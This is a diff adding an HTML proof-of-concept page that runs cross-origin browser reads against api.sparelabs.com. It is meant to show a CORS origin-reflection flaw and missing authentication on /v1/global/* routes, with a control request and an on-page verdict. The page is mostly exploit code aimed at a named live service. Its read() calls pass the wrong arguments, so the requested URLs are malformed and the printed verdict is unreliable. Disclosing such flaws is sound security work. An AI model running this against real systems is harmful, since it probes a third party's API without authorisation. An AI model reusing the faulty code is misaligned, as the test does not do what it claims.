@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC — cross-origin read of api.sparelabs.com (proof only, no exfiltration)</title>
+<style>
+body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0f1115;color:#e6edf3;max-width:900px;margin:2rem auto;padding:0 1rem}
+pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:1rem;white-space:pre-wrap;word-break:break-all}
+.dim{color:#8b949e}.ok{color:#3fb950}.bad{color:#f85149}
+</style>
+</head>
+<body>
+<h1 style="font-size:1.1rem">Proof of concept — api.sparelabs.com reflects any browser origin and serves /v1/global/* without valid authentication</h1>
+<p class="dim">This page performs exactly what an attacker page would do: cross-origin requests from an arbitrary origin (this site). It sends NO data anywhere and exfiltrates nothing; the two successful reads below are the proof. On a compliant API, the browser would block both requests before any data arrives (TypeError: Failed to fetch).</p>
+<pre id="out">running…</pre>
+<script>
+var API="https://api.sparelabs.com", out=document.getElementById('out');
+function log(s){ out.textContent += "\n"+s; }
+function read(label,path,bearer){
+  var x=new XMLHttpRequest();
+  try{
+    x.open("GET", API+path, false);
+    if(bearer) x.setRequestHeader("Authorization", bearer);
+    x.send(null);
+    var acao=x.getResponseHeader("Access-Control-Allow-Origin");
+    log("+ "+label);
+    log("  HTTP "+x.status+"  Access-Control-Allow-Origin: "+(acao||"(blocked: header absent)"));
+    if(x.status==200) log("  body: "+x.responseText.slice(0,180));
+    return x.status;
+  }catch(e){
+    log("+ "+label);
+    log("  BLOCKED "+e.name+": "+e.message);
+    return -1;
+  }
+}
+log("== cross-origin reads from this page (Origin: "+location.origin+") ==");
+var s1=read("/v1/global/regions","Bearer garbage-token");
+var s2=read("/v1/global/organizations",null);
+log("-- control: route with proper auth gate --");
+var s3=read("/v1/journeys",null);
+log("== verdict ==");
+log(s1===200 && s2===200 ? "BROWSER ALLOWED BOTH READS (CORS bypass + missing auth confirmed)":"browser blocked (policy working)");
+</script>
+</body>
+</html>
